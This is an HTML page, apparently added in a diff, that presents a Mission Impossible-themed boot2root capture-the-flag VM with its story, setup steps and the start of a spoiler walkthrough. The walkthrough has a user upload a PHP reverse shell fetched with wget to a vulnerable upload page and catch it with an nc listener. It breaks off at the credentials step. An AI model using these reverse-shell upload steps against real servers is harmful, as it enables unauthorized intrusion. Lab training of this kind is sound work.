@@ -1,0 +1,1426 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Project Mission Impossible - CTF Challenge</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;600;700&family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
+  <style>
+    :root {
+      --bg: #0a0e1a;
+      --bg2: #0d1117;
+      --bg3: #161b27;
+      --surface: #1a2133;
+      --border: #2a3a5c;
+      --accent: #00d4ff;
+      --accent2: #7c3aed;
+      --green: #00ff88;
+      --red: #ff4757;
+      --yellow: #ffd60a;
+      --text: #e6edf3;
+      --muted: #8b949e;
+      --font-mono: 'Fira Code', monospace;
+      --font-body: 'Space Grotesk', sans-serif;
+    }
+
+    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+    html { scroll-behavior: smooth; }
+
+    body {
+      font-family: var(--font-body);
+      background: var(--bg);
+      color: var(--text);
+      line-height: 1.7;
+      overflow-x: hidden;
+    }
+
+    /* Scrollbar */
+    ::-webkit-scrollbar { width: 6px; }
+    ::-webkit-scrollbar-track { background: var(--bg); }
+    ::-webkit-scrollbar-thumb { background: var(--accent2); border-radius: 3px; }
+
+    /* ─── NAV ─── */
+    nav {
+      position: fixed; top: 0; left: 0; right: 0; z-index: 1000;
+      background: rgba(10,14,26,0.92);
+      backdrop-filter: blur(16px);
+      border-bottom: 1px solid var(--border);
+      padding: 0 2rem;
+      height: 60px;
+      display: flex; align-items: center; justify-content: space-between;
+    }
+
+    .nav-logo {
+      font-family: var(--font-mono);
+      font-size: 1.1rem;
+      font-weight: 600;
+      color: var(--accent);
+      text-decoration: none;
+      letter-spacing: -0.5px;
+    }
+    .nav-logo span { color: var(--text); }
+
+    .nav-links {
+      list-style: none;
+      display: flex; gap: 0.25rem;
+      flex-wrap: wrap;
+    }
+
+    .nav-links a {
+      color: var(--muted);
+      text-decoration: none;
+      font-size: 0.85rem;
+      font-weight: 500;
+      padding: 0.4rem 0.75rem;
+      border-radius: 6px;
+      transition: all 0.2s;
+    }
+    .nav-links a:hover { color: var(--text); background: var(--surface); }
+
+    /* ─── HERO ─── */
+    .hero {
+      min-height: 100vh;
+      display: flex; align-items: center;
+      padding: 80px 2rem 2rem;
+      background: var(--bg2);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .hero::before {
+      content: '';
+      position: absolute; inset: 0;
+      background:
+        radial-gradient(ellipse 60% 50% at 70% 50%, rgba(124,58,237,0.12) 0%, transparent 70%),
+        radial-gradient(ellipse 40% 40% at 20% 80%, rgba(0,212,255,0.08) 0%, transparent 60%);
+      pointer-events: none;
+    }
+
+    /* Grid lines background */
+    .hero::after {
+      content: '';
+      position: absolute; inset: 0;
+      background-image:
+        linear-gradient(rgba(42,58,92,0.25) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(42,58,92,0.25) 1px, transparent 1px);
+      background-size: 40px 40px;
+      pointer-events: none;
+      mask-image: radial-gradient(ellipse 80% 80% at 50% 50%, black 0%, transparent 100%);
+    }
+
+    .hero-inner {
+      max-width: 1200px; margin: 0 auto; width: 100%;
+      display: grid; grid-template-columns: 1fr 1fr; gap: 4rem; align-items: center;
+      position: relative; z-index: 1;
+    }
+
+    .hero-greeting {
+      font-family: var(--font-mono);
+      font-size: 0.95rem;
+      color: var(--accent);
+      margin-bottom: 0.75rem;
+      opacity: 0; animation: fadeUp 0.6s 0.2s forwards;
+    }
+
+    .hero-title {
+      font-size: clamp(2.2rem, 5vw, 3.8rem);
+      font-weight: 700;
+      line-height: 1.1;
+      letter-spacing: -1.5px;
+      margin-bottom: 1rem;
+      opacity: 0; animation: fadeUp 0.6s 0.35s forwards;
+    }
+    .hero-title .accent { color: var(--accent); }
+    .hero-title .accent2 { color: var(--accent2); }
+
+    .hero-subtitle {
+      font-size: 1.1rem;
+      color: var(--muted);
+      margin-bottom: 2rem;
+      opacity: 0; animation: fadeUp 0.6s 0.5s forwards;
+    }
+
+    .hero-btns {
+      display: flex; gap: 0.75rem; flex-wrap: wrap;
+      opacity: 0; animation: fadeUp 0.6s 0.65s forwards;
+    }
+
+    .btn {
+      display: inline-flex; align-items: center; gap: 0.5rem;
+      padding: 0.7rem 1.5rem;
+      border-radius: 8px;
+      font-family: var(--font-mono);
+      font-size: 0.875rem;
+      font-weight: 500;
+      text-decoration: none;
+      cursor: pointer;
+      border: none;
+      transition: all 0.2s;
+    }
+    .btn-primary {
+      background: var(--accent);
+      color: var(--bg);
+    }
+    .btn-primary:hover { background: #00b8e0; transform: translateY(-2px); box-shadow: 0 8px 24px rgba(0,212,255,0.25); }
+
+    .btn-outline {
+      background: transparent;
+      color: var(--text);
+      border: 1px solid var(--border);
+    }
+    .btn-outline:hover { border-color: var(--accent); color: var(--accent); transform: translateY(-2px); }
+
+    /* Code card in hero */
+    .hero-code {
+      background: var(--bg3);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      overflow: hidden;
+      opacity: 0; animation: fadeUp 0.7s 0.4s forwards;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.4);
+    }
+
+    .code-header {
+      background: var(--surface);
+      padding: 0.7rem 1rem;
+      display: flex; align-items: center; gap: 0.5rem;
+      border-bottom: 1px solid var(--border);
+    }
+    .dot { width: 12px; height: 12px; border-radius: 50%; }
+    .dot-red { background: #ff5f57; }
+    .dot-yellow { background: #ffbd2e; }
+    .dot-green { background: #28ca41; }
+    .code-filename { font-family: var(--font-mono); font-size: 0.75rem; color: var(--muted); margin-left: 0.5rem; }
+
+    .code-body {
+      padding: 1.25rem 1.5rem;
+      font-family: var(--font-mono);
+      font-size: 0.82rem;
+      line-height: 1.9;
+    }
+    .code-body .k { color: #ff79c6; }
+    .code-body .s { color: var(--green); }
+    .code-body .v { color: var(--accent); }
+    .code-body .c { color: var(--muted); }
+    .code-body .n { color: #bd93f9; }
+    .code-body .p { color: var(--yellow); }
+
+    /* ─── SECTIONS ─── */
+    .section {
+      padding: 5rem 2rem;
+    }
+
+    .section:nth-child(even) { background: var(--bg2); }
+    .section:nth-child(odd) { background: var(--bg); }
+
+    .container { max-width: 1100px; margin: 0 auto; }
+
+    .section-label {
+      font-family: var(--font-mono);
+      font-size: 0.8rem;
+      color: var(--accent);
+      letter-spacing: 2px;
+      text-transform: uppercase;
+      margin-bottom: 0.5rem;
+    }
+
+    .section-title {
+      font-size: clamp(1.6rem, 3vw, 2.4rem);
+      font-weight: 700;
+      letter-spacing: -0.5px;
+      margin-bottom: 1rem;
+      color: var(--text);
+    }
+    .section-title span { color: var(--accent); }
+
+    .section-desc {
+      color: var(--muted);
+      max-width: 600px;
+      margin-bottom: 3rem;
+    }
+
+    /* ─── CARDS ─── */
+    .card {
+      background: var(--bg3);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 1.5rem;
+      transition: border-color 0.2s, transform 0.2s, box-shadow 0.2s;
+    }
+    .card:hover {
+      border-color: rgba(0,212,255,0.4);
+      transform: translateY(-4px);
+      box-shadow: 0 12px 40px rgba(0,212,255,0.08);
+    }
+    .card h3 { font-size: 1.1rem; font-weight: 600; margin-bottom: 0.5rem; }
+    .card p { color: var(--muted); font-size: 0.9rem; }
+
+    .card-icon {
+      font-size: 1.75rem;
+      margin-bottom: 0.75rem;
+    }
+
+    /* ─── ABOUT / INFO TABLE ─── */
+    .info-table { width: 100%; border-collapse: collapse; margin-top: 1.5rem; }
+    .info-table th, .info-table td {
+      padding: 0.75rem 1rem;
+      text-align: left;
+      border-bottom: 1px solid var(--border);
+      font-size: 0.9rem;
+    }
+    .info-table th { color: var(--muted); font-weight: 500; width: 40%; }
+    .info-table td { color: var(--text); }
+
+    /* ─── TIMELINE ─── */
+    .timeline { position: relative; padding-left: 2rem; }
+    .timeline::before {
+      content: ''; position: absolute;
+      left: 7px; top: 0; bottom: 0;
+      width: 2px;
+      background: linear-gradient(to bottom, var(--accent), var(--accent2));
+    }
+    .timeline-item {
+      position: relative;
+      margin-bottom: 2.5rem;
+      padding-left: 1.5rem;
+    }
+    .timeline-item::before {
+      content: '';
+      position: absolute; left: -1.6rem; top: 6px;
+      width: 12px; height: 12px;
+      border-radius: 50%;
+      background: var(--accent);
+      border: 2px solid var(--bg);
+      box-shadow: 0 0 0 3px rgba(0,212,255,0.2);
+    }
+    .timeline-item h4 {
+      font-family: var(--font-mono);
+      font-size: 0.95rem;
+      color: var(--accent);
+      margin-bottom: 0.25rem;
+    }
+    .timeline-item .phase-tag {
+      display: inline-block;
+      background: rgba(0,212,255,0.1);
+      color: var(--accent);
+      font-family: var(--font-mono);
+      font-size: 0.7rem;
+      padding: 0.15rem 0.5rem;
+      border-radius: 4px;
+      margin-bottom: 0.5rem;
+    }
+    .timeline-item p { color: var(--muted); font-size: 0.9rem; }
+
+    /* ─── CODE BLOCKS ─── */
+    .code-block {
+      background: var(--bg2);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      overflow: hidden;
+      margin: 1rem 0;
+    }
+    .code-block-header {
+      background: var(--surface);
+      padding: 0.5rem 1rem;
+      display: flex; justify-content: space-between; align-items: center;
+      border-bottom: 1px solid var(--border);
+    }
+    .code-block-lang {
+      font-family: var(--font-mono); font-size: 0.7rem; color: var(--muted);
+    }
+    .code-block pre {
+      padding: 1rem 1.25rem;
+      font-family: var(--font-mono);
+      font-size: 0.82rem;
+      line-height: 1.7;
+      overflow-x: auto;
+      color: var(--text);
+    }
+    .code-block .cm { color: var(--muted); font-style: italic; }
+    .code-block .ck { color: #ff79c6; }
+    .code-block .cs { color: var(--green); }
+    .code-block .cv { color: var(--accent); }
+    .code-block .cn { color: #bd93f9; }
+
+    /* Inline code */
+    code {
+      font-family: var(--font-mono);
+      background: rgba(0,212,255,0.1);
+      color: var(--accent);
+      padding: 0.15em 0.45em;
+      border-radius: 4px;
+      font-size: 0.875em;
+    }
+
+    /* ─── BADGES ─── */
+    .badge {
+      display: inline-block;
+      font-family: var(--font-mono);
+      font-size: 0.7rem;
+      padding: 0.2rem 0.55rem;
+      border-radius: 4px;
+      margin: 0.15rem;
+    }
+    .badge-blue { background: rgba(0,212,255,0.12); color: var(--accent); border: 1px solid rgba(0,212,255,0.25); }
+    .badge-purple { background: rgba(124,58,237,0.15); color: #a78bfa; border: 1px solid rgba(124,58,237,0.3); }
+    .badge-green { background: rgba(0,255,136,0.1); color: var(--green); border: 1px solid rgba(0,255,136,0.25); }
+    .badge-red { background: rgba(255,71,87,0.12); color: var(--red); border: 1px solid rgba(255,71,87,0.25); }
+    .badge-yellow { background: rgba(255,214,10,0.1); color: var(--yellow); border: 1px solid rgba(255,214,10,0.25); }
+
+    /* ─── ACCORDION ─── */
+    .accordion { display: flex; flex-direction: column; gap: 0.75rem; }
+    .accordion-item {
+      background: var(--bg3);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      overflow: hidden;
+      transition: border-color 0.2s;
+    }
+    .accordion-item.open { border-color: rgba(0,212,255,0.35); }
+
+    .accordion-header {
+      padding: 1rem 1.25rem;
+      display: flex; justify-content: space-between; align-items: center;
+      cursor: pointer;
+      user-select: none;
+      transition: background 0.2s;
+    }
+    .accordion-header:hover { background: rgba(255,255,255,0.03); }
+    .accordion-header span { font-weight: 500; font-size: 0.95rem; }
+
+    .accordion-arrow {
+      color: var(--muted);
+      font-family: var(--font-mono);
+      font-size: 0.85rem;
+      transition: transform 0.3s;
+    }
+    .accordion-item.open .accordion-arrow { transform: rotate(180deg); color: var(--accent); }
+
+    .accordion-body {
+      max-height: 0; overflow: hidden;
+      transition: max-height 0.35s ease;
+      padding: 0 1.25rem;
+    }
+    .accordion-body.open { max-height: 3000px; padding: 0 1.25rem 1.25rem; }
+    .accordion-body p, .accordion-body li { color: var(--muted); font-size: 0.9rem; margin-bottom: 0.4rem; }
+    .accordion-body ul, .accordion-body ol { padding-left: 1.25rem; }
+    .accordion-body li { margin-bottom: 0.3rem; }
+    .accordion-body h4 {
+      font-family: var(--font-mono);
+      font-size: 0.85rem;
+      color: var(--accent);
+      margin: 1rem 0 0.4rem;
+    }
+    .accordion-body h4.red { color: var(--red); }
+    .accordion-body h4.green { color: var(--green); }
+
+    /* ─── GRID LAYOUTS ─── */
+    .grid-3 { display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap: 1.25rem; }
+    .grid-2 { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 1.25rem; }
+
+    /* ─── WARNING BOX ─── */
+    .warning-box {
+      background: rgba(255,71,87,0.08);
+      border: 1px solid rgba(255,71,87,0.3);
+      border-left: 3px solid var(--red);
+      border-radius: 8px;
+      padding: 1rem 1.25rem;
+      margin-bottom: 1.5rem;
+    }
+    .warning-box strong { color: var(--red); font-family: var(--font-mono); }
+
+    .info-box {
+      background: rgba(0,212,255,0.06);
+      border: 1px solid rgba(0,212,255,0.2);
+      border-left: 3px solid var(--accent);
+      border-radius: 8px;
+      padding: 1rem 1.25rem;
+      margin: 1rem 0;
+    }
+    .info-box p { color: var(--muted); font-size: 0.9rem; }
+
+    .success-box {
+      background: rgba(0,255,136,0.06);
+      border: 1px solid rgba(0,255,136,0.2);
+      border-left: 3px solid var(--green);
+      border-radius: 8px;
+      padding: 1rem 1.25rem;
+      margin: 1rem 0;
+    }
+
+    /* ─── TOOLS SECTION ─── */
+    .tool-card {
+      background: var(--bg3);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 1.25rem;
+      transition: all 0.2s;
+    }
+    .tool-card:hover { border-color: rgba(0,212,255,0.4); transform: translateY(-3px); }
+    .tool-card .tool-icon { font-size: 1.5rem; margin-bottom: 0.5rem; }
+    .tool-card h3 { font-size: 1rem; font-weight: 600; margin-bottom: 0.3rem; }
+    .tool-card p { color: var(--muted); font-size: 0.82rem; margin-bottom: 0.75rem; }
+
+    /* ─── FLAG DISPLAY ─── */
+    .flag-box {
+      background: var(--bg2);
+      border: 1px solid var(--green);
+      border-radius: 10px;
+      padding: 1.5rem 2rem;
+      text-align: center;
+      margin: 1.5rem 0;
+      box-shadow: 0 0 30px rgba(0,255,136,0.1), inset 0 0 30px rgba(0,255,136,0.03);
+    }
+    .flag-box code {
+      font-size: 1rem;
+      color: var(--green);
+      background: rgba(0,255,136,0.08);
+      border: none;
+      padding: 0.5rem 1rem;
+      display: block;
+      word-break: break-all;
+    }
+
+    /* ─── CONTACT ─── */
+    .contact-link {
+      display: flex; align-items: center; gap: 0.75rem;
+      padding: 0.75rem 1rem;
+      border-radius: 8px;
+      text-decoration: none;
+      color: var(--text);
+      border: 1px solid var(--border);
+      font-size: 0.9rem;
+      transition: all 0.2s;
+      margin-bottom: 0.5rem;
+    }
+    .contact-link:hover { border-color: var(--accent); color: var(--accent); background: rgba(0,212,255,0.05); }
+    .contact-link .icon { font-size: 1.2rem; }
+
+    /* ─── FOOTER ─── */
+    footer {
+      background: var(--bg2);
+      border-top: 1px solid var(--border);
+      padding: 2.5rem 2rem;
+      text-align: center;
+    }
+    footer p { color: var(--muted); font-size: 0.85rem; }
+    footer a { color: var(--accent); text-decoration: none; }
+    footer .footer-logo {
+      font-family: var(--font-mono);
+      font-size: 1rem;
+      color: var(--text);
+      margin-bottom: 0.5rem;
+    }
+    footer .footer-logo span { color: var(--accent); }
+
+    /* ─── ANIMATIONS ─── */
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0; }
+    }
+    .cursor { animation: blink 1s step-end infinite; color: var(--accent); }
+
+    /* Scroll-reveal */
+    .reveal { opacity: 0; transform: translateY(24px); transition: opacity 0.55s ease, transform 0.55s ease; }
+    .reveal.visible { opacity: 1; transform: none; }
+
+    /* ─── RESPONSIVE ─── */
+    @media (max-width: 768px) {
+      .hero-inner { grid-template-columns: 1fr; gap: 2rem; }
+      .hero-code { display: none; }
+      .nav-links { display: none; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- ═══════════════ NAV ═══════════════ -->
+<nav>
+  <a href="#home" class="nav-logo">&lt;<span>CTF</span> /&gt;</a>
+  <ul class="nav-links">
+    <li><a href="#about">About</a></li>
+    <li><a href="#story">Story</a></li>
+    <li><a href="#download">Download</a></li>
+    <li><a href="#setup">Setup</a></li>
+    <li><a href="#walkthrough">Walkthrough</a></li>
+    <li><a href="#vulnerabilities">Vulns</a></li>
+    <li><a href="#tools">Tools</a></li>
+    <li><a href="#faq">FAQ</a></li>
+    <li><a href="#contact">Contact</a></li>
+  </ul>
+</nav>
+
+<!-- ═══════════════ HERO ═══════════════ -->
+<section class="hero" id="home">
+  <div class="hero-inner">
+    <div>
+      <p class="hero-greeting">// mission_briefing.sh</p>
+      <h1 class="hero-title">
+        Project<br/>
+        <span class="accent">Mission</span><br/>
+        <span class="accent2">Impossible</span>
+      </h1>
+      <p class="hero-subtitle">
+        A Capture The Flag challenge for penetration testing practice.<br/>
+        "Your mission, should you choose to accept it..."
+      </p>
+      <div class="hero-btns">
+        <a href="#download" class="btn btn-primary">⬇ Download .OVA</a>
+        <a href="#walkthrough" class="btn btn-outline">📖 Walkthrough</a>
+      </div>
+    </div>
+
+    <div class="hero-code">
+      <div class="code-header">
+        <div class="dot dot-red"></div>
+        <div class="dot dot-yellow"></div>
+        <div class="dot dot-green"></div>
+        <span class="code-filename">mission_brief.yaml</span>
+      </div>
+      <div class="code-body">
+        <span class="k">name</span>: <span class="s">CTF_Mission_Impossible</span><br/>
+        <span class="k">difficulty</span>: <span class="v">Beginner</span> → <span class="v">Intermediate</span><br/>
+        <span class="k">type</span>: <span class="s">Boot2Root</span><br/>
+        <span class="k">platform</span>: <span class="s">VirtualBox (.ova)</span><br/>
+        <span class="k">os</span>: <span class="s">Debian 13 (Trixie)</span><br/>
+        <span class="k">phases</span>:<br/>
+        &nbsp;&nbsp;- <span class="n">recon</span>: <span class="s">nmap + web enum</span><br/>
+        &nbsp;&nbsp;- <span class="n">initial_access</span>: <span class="s">file upload RCE</span><br/>
+        &nbsp;&nbsp;- <span class="n">lateral_move</span>: <span class="s">info disclosure</span><br/>
+        &nbsp;&nbsp;- <span class="n">privesc</span>: <span class="s">SUID binary exploit</span><br/>
+        <span class="k">flag</span>: <span class="p">IMF{...}</span><span class="cursor">_</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════ ABOUT ═══════════════ -->
+<section class="section" id="about">
+  <div class="container">
+    <p class="section-label reveal">// about</p>
+    <h2 class="section-title reveal">About the <span>Challenge</span></h2>
+    <p class="section-desc reveal">
+      A vulnerable virtual machine designed for cybersecurity training. Inspired by the Mission Impossible franchise, offering a story-driven hacking experience with multiple exploitation phases.
+    </p>
+
+    <div class="grid-3 reveal">
+      <div class="card">
+        <div class="card-icon">🎬</div>
+        <h3>Story-Driven</h3>
+        <p>Immersive Mission Impossible themed narrative throughout the challenge.</p>
+      </div>
+      <div class="card">
+        <div class="card-icon">🎓</div>
+        <h3>Educational</h3>
+        <p>Learn web exploitation, privilege escalation, and post-exploitation techniques.</p>
+      </div>
+      <div class="card">
+        <div class="card-icon">⚡</div>
+        <h3>Beginner-Friendly</h3>
+        <p>Perfect for those new to penetration testing with guided learning.</p>
+      </div>
+    </div>
+
+    <div class="card reveal" style="margin-top: 1.5rem;">
+      <table class="info-table">
+        <tr><th>Difficulty</th><td><span class="badge badge-green">EASY → MEDIUM</span></td></tr>
+        <tr><th>Type</th><td>Boot2Root CTF</td></tr>
+        <tr><th>Platform</th><td>VirtualBox (.ova format)</td></tr>
+        <tr><th>Operating System</th><td>Debian 13 (Trixie)</td></tr>
+        <tr><th>File Size</th><td>~2.5 GB</td></tr>
+        <tr><th>Network</th><td>Bridged or Host-Only</td></tr>
+        <tr><th>Ports</th><td>
+          <span class="badge badge-blue">22 SSH</span>
+          <span class="badge badge-blue">80 HTTP</span>
+          <span class="badge badge-blue">8080 HTTP</span>
+          <span class="badge badge-blue">8081 HTTP</span>
+          <span class="badge badge-purple">21 FTP</span>
+        </td></tr>
+      </table>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════ STORY ═══════════════ -->
+<section class="section" id="story">
+  <div class="container">
+    <p class="section-label reveal">// mission_story.sh</p>
+    <h2 class="section-title reveal">The Mission <span>Story</span></h2>
+    <p class="section-desc reveal">
+      Welcome to the Impossible Missions Force (IMF). You've been assigned to investigate a compromised secure network spanning multiple classified operations.
+    </p>
+
+    <div class="timeline reveal">
+      <div class="timeline-item">
+        <span class="phase-tag">PHASE 01</span>
+        <h4>Mission Impossible (1996) — Prague, Czech Republic</h4>
+        <p>Infiltrate the IMF network through their web portal on port 8080. Intelligence suggests a file upload vulnerability that grants initial access.</p>
+      </div>
+      <div class="timeline-item">
+        <span class="phase-tag">PHASE 02</span>
+        <h4>Ghost Protocol (2011) — Moscow → Dubai → Mumbai</h4>
+        <p>As Agent Ethan Hunt, investigate the Ghost Protocol server on port 8081. Hidden credentials for Luther Stickell are buried in the classified files.</p>
+      </div>
+      <div class="timeline-item">
+        <span class="phase-tag">PHASE 03</span>
+        <h4>Rogue Nation (2015) — System Level Access</h4>
+        <p>As Luther Stickell, find and exploit a powerful tool left behind by Agent Ilsa Faust to escalate privileges to root.</p>
+      </div>
+      <div class="timeline-item">
+        <span class="phase-tag">PHASE 04</span>
+        <h4>The Final Reckoning — Capture the Flag</h4>
+        <p>With root access achieved, access the classified final mission briefing and capture the ultimate flag.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════ DOWNLOAD ═══════════════ -->
+<section class="section" id="download">
+  <div class="container">
+    <p class="section-label reveal">// download_vm.sh</p>
+    <h2 class="section-title reveal"><span>Download</span> Challenge</h2>
+
+    <div class="warning-box reveal">
+      <strong>⚠ SECURITY WARNING</strong>
+      <p style="color: var(--muted); font-size:0.9rem; margin-top:0.4rem;">
+        This VM contains <strong style="color:var(--red)">intentional vulnerabilities</strong> for educational purposes only. Run exclusively in isolated lab environments. Never expose to the internet.
+      </p>
+    </div>
+
+    <div class="card reveal" style="margin-bottom:1.25rem;">
+      <h3 style="margin-bottom:1rem; color: var(--accent);">Primary Download</h3>
+      <div style="text-align:center; padding: 1.5rem 0;">
+        <a href="YOUR_GOOGLE_DRIVE_LINK_HERE" class="btn btn-primary" target="_blank" style="font-size:1rem; padding:0.9rem 2.5rem;">
+          📥 Download from Google Drive
+        </a>
+      </div>
+      <div class="code-block" style="margin-top:1rem;">
+        <div class="code-block-header"><span class="code-block-lang">file_info</span></div>
+        <pre><span class="cv">filename</span>: Project_Mission_Impossible.ova
+<span class="cv">size</span>:     ~2.5 GB
+<span class="cv">format</span>:   Open Virtualization Format (.ova)
+<span class="cv">md5</span>:      [Generate after upload]</pre>
+      </div>
+    </div>
+
+    <div class="card reveal">
+      <h3 style="margin-bottom:0.75rem; color: var(--muted); font-size:0.95rem;">Mirror Links</h3>
+      <p style="color:var(--muted); font-size:0.85rem;">Alternative sources (coming soon):</p>
+      <div style="margin-top:0.75rem; display:flex; gap:0.5rem; flex-wrap:wrap;">
+        <span class="badge badge-purple">MEGA.nz — Soon</span>
+        <span class="badge badge-purple">MediaFire — Soon</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════ SETUP ═══════════════ -->
+<section class="section" id="setup">
+  <div class="container">
+    <p class="section-label reveal">// setup_lab.sh</p>
+    <h2 class="section-title reveal">Setup <span>Instructions</span></h2>
+    <p class="section-desc reveal">Get your lab environment ready in minutes.</p>
+
+    <div class="accordion reveal">
+
+      <div class="accordion-item">
+        <div class="accordion-header" onclick="toggleAccordion(this)">
+          <span>Step 1 — Prerequisites</span>
+          <span class="accordion-arrow">▼</span>
+        </div>
+        <div class="accordion-body">
+          <p>Before you begin, ensure you have:</p>
+          <ul>
+            <li><strong>VirtualBox</strong> 6.0+ — <a href="https://www.virtualbox.org/wiki/Downloads" style="color:var(--accent)" target="_blank">Download Here</a></li>
+            <li><strong>Kali Linux</strong> or any pentesting OS — <a href="https://www.kali.org/get-kali/" style="color:var(--accent)" target="_blank">Download Here</a></li>
+            <li>At least <strong>4GB RAM</strong> and <strong>20GB free disk space</strong></li>
+            <li>Basic Linux command line familiarity</li>
+            <li>Familiarity with nmap, netcat, etc.</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="accordion-item">
+        <div class="accordion-header" onclick="toggleAccordion(this)">
+          <span>Step 2 — Import OVA File</span>
+          <span class="accordion-arrow">▼</span>
+        </div>
+        <div class="accordion-body">
+          <ol>
+            <li>Download <code>Project_Mission_Impossible.ova</code></li>
+            <li>Open VirtualBox → <strong>File → Import Appliance</strong></li>
+            <li>Select the downloaded .ova file</li>
+            <li>Review settings (2GB RAM, 2 CPU recommended)</li>
+            <li>Click <strong>Import</strong> — takes 5–10 minutes</li>
+          </ol>
+        </div>
+      </div>
+
+      <div class="accordion-item">
+        <div class="accordion-header" onclick="toggleAccordion(this)">
+          <span>Step 3 — Network Configuration</span>
+          <span class="accordion-arrow">▼</span>
+        </div>
+        <div class="accordion-body">
+          <h4 class="green">Option A: Bridged Adapter (Recommended)</h4>
+          <ol>
+            <li>Right-click VM → <strong>Settings → Network</strong></li>
+            <li>Change "Attached to" → <strong>Bridged Adapter</strong></li>
+            <li>VM will get an IP from your router (e.g. <code>192.168.1.x</code>)</li>
+          </ol>
+          <h4 class="green" style="margin-top:1rem;">Option B: Host-Only Adapter (Isolated)</h4>
+          <ol>
+            <li><strong>File → Host Network Manager</strong> → Create network</li>
+            <li>VM Settings → <strong>Network → Host-Only Adapter</strong></li>
+            <li>VM will be isolated from your home network</li>
+          </ol>
+        </div>
+      </div>
+
+      <div class="accordion-item">
+        <div class="accordion-header" onclick="toggleAccordion(this)">
+          <span>Step 4 — Start the Machine</span>
+          <span class="accordion-arrow">▼</span>
+        </div>
+        <div class="accordion-body">
+          <ol>
+            <li>Select <strong>Project Mission Impossible</strong> VM</li>
+            <li>Click <strong>Start</strong> — wait ~30 seconds to boot</li>
+            <li>Find IP by running <code>ip addr show</code> on the VM console</li>
+          </ol>
+          <div class="code-block" style="margin-top:0.75rem;">
+            <div class="code-block-header"><span class="code-block-lang">bash</span></div>
+            <pre><span class="cm"># Or scan your network from Kali</span>
+nmap -sn 192.168.1.0/24</pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="accordion-item">
+        <div class="accordion-header" onclick="toggleAccordion(this)">
+          <span>Step 5 — Begin Your Mission</span>
+          <span class="accordion-arrow">▼</span>
+        </div>
+        <div class="accordion-body">
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">bash</span></div>
+            <pre><span class="cm"># Scan the target</span>
+nmap -sV -sC -p- &lt;TARGET_IP&gt;
+
+<span class="cm"># Visit the web interface</span>
+firefox http://&lt;TARGET_IP&gt;</pre>
+          </div>
+          <p style="margin-top:0.75rem;">Your mission begins at port 80. Follow the clues and good luck, Agent! 🎯</p>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════ WALKTHROUGH ═══════════════ -->
+<section class="section" id="walkthrough">
+  <div class="container">
+    <p class="section-label reveal">// complete_walkthrough.sh</p>
+    <h2 class="section-title reveal">Complete <span>Walkthrough</span></h2>
+
+    <div class="warning-box reveal">
+      <strong>⚠ SPOILER ALERT</strong>
+      <p style="color: var(--muted); font-size:0.9rem; margin-top:0.4rem;">
+        Contains the full solution. Try solving it yourself first!
+      </p>
+    </div>
+
+    <div class="accordion reveal">
+
+      <!-- Phase 1 -->
+      <div class="accordion-item">
+        <div class="accordion-header" onclick="toggleAccordion(this)">
+          <span><span class="badge badge-blue" style="margin-right:0.5rem">Phase 1</span> Reconnaissance &amp; Initial Access</span>
+          <span class="accordion-arrow">▼</span>
+        </div>
+        <div class="accordion-body">
+          <h4>Step 1: Port Scanning</h4>
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">bash</span></div>
+            <pre>nmap -sV -sC -p- &lt;TARGET_IP&gt; -oN scan.txt</pre>
+          </div>
+          <p><strong>Expected open ports:</strong></p>
+          <ul>
+            <li>22 (SSH), 80 (HTTP), 8080 (HTTP - Mission Impossible)</li>
+            <li>8081 (HTTP - Ghost Protocol), 21 (FTP), 110, 143 (POP3/IMAP)</li>
+          </ul>
+          <h4>Step 2: Web Enumeration</h4>
+          <p>Visit <code>http://&lt;TARGET_IP&gt;</code> — you'll find a hint pointing to port 8080.</p>
+          <h4>Step 3: Explore Mission Impossible Website</h4>
+          <p>Navigate to <code>http://&lt;TARGET_IP&gt;:8080</code></p>
+          <ul>
+            <li>Explore all 10 buttons/links</li>
+            <li>Read mission1.php, mission2.php, mission3.php</li>
+            <li>Find the <strong>upload.php</strong> page</li>
+          </ul>
+          <h4>Step 4: PHP Reverse Shell</h4>
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">bash</span></div>
+            <pre>wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+
+<span class="cm"># Edit and set your IP/port</span>
+nano php-reverse-shell.php
+<span class="cm"># $ip = 'YOUR_KALI_IP';  $port = 4444;</span></pre>
+          </div>
+          <h4>Step 5: Get Shell</h4>
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">bash</span></div>
+            <pre><span class="cm"># Terminal 1: Start listener</span>
+nc -lvnp 4444
+
+<span class="cm"># Terminal 2: Upload shell.php, then visit:</span>
+<span class="cm"># http://&lt;TARGET_IP&gt;:8080/uploads/shell.php</span></pre>
+          </div>
+          <h4>Step 6: Find Credentials</h4>
+          <div class="code-block">
